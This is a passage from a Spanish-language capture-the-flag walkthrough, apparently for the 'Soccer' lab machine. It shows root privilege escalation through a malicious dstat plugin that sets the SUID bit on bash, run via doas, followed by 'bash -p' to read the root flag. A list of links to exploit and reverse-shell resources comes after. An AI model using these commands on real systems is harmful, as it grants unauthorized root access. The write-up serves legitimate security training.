Dentro pondremos lo siguiente:
```
import os

os.system('chmod +s /usr/bin/bash')
```
Guardamos, cerramos y antes de probarlo, veamos los permisos de la Bash:
```
player@soccer:/usr/local/share/dstat$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```
Ahora activemos el script, pero CUIDADO, recuerda que no tenemos permisos como SUDO, así que no lo uses. Usaremos el comando **doas**, como lo menciona el mismo blog, pero en otro caso:
* https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/doas/

Activemos el script pues:
```
doas -u root /usr/bin/dstat --exploit
```
A lo mejor te marca un error, no sé qué fue lo que hice, pero jugué con las comillas simples y active el script varias veces y con eso función.

Ahora veamos los permisos de la Bash:
```
player@soccer:/usr/local/share/dstat$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```
Y entremos a la Bash:
```
player@soccer:/usr/local/share/dstat$ bash -p
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# ls
app  root.txt  run.sql  snap
bash-5.0# cat root.txt
```
¡Listo! Ya tenemos la flag del Root.


<br>
<br>
<div style="position: relative;">
 <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>

* https://github.com/febinrev/tinyfilemanager-2.4.3-exploit
* https://github.com/pentestmonkey/php-reverse-shell
* https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html
* https://linuxhint.com/sql-injection-kali-linux/
* https://kali-linux.net/article/sqlsus/
* https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
* https://github.com/carlospolop/PEASS-ng/releases/tag/20230409
* https://underc0de.org/foro/gnulinux/doas-una-alternativa-a-sudo-simple-ligera-y-segura/
* https://0x1.gitlab.io/exploit/Linux-Privilege-Escalation/
* https://gtfobins.github.io/gtfobins/dstat/
* https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/doas/
* https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/


<br>
# FIN
